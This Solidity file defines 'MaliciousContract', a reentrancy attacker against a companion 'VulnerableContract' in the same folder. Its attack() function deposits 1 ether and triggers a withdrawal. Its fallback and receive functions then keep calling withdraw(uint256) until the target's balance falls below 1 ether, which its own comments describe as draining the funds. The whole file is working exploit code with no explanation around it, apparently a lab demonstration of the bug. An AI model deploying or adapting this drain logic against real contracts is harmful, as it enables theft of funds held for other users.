// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract.sol";

contract MaliciousContract {
    address payable public vulnerableScAddress;

    constructor(address payable _vulnerableScAddress) {
        vulnerableScAddress = _vulnerableScAddress;
    }

    fallback() external payable {
        // Recursive call until funds are drained.
        if (vulnerableScAddress.balance >= 1 ether) {
            (bool success, ) = vulnerableScAddress.call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
            require(success, "withdraw failed.");
        }
    }

    receive() external payable {
        // Recursive call until funds are drained.
        if (vulnerableScAddress.balance >= 1 ether) {
            (bool success, ) = vulnerableScAddress.call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
            require(success, "withdraw failed.");
        }
    }

    function attack() public {
        // Deposits first time.
        (bool success, ) = vulnerableScAddress.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "deposit failed.");

        // Triggers withraw vulnerability.
        (bool success2, ) = vulnerableScAddress.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        require(success2, "withdraw failed.");
    }
}
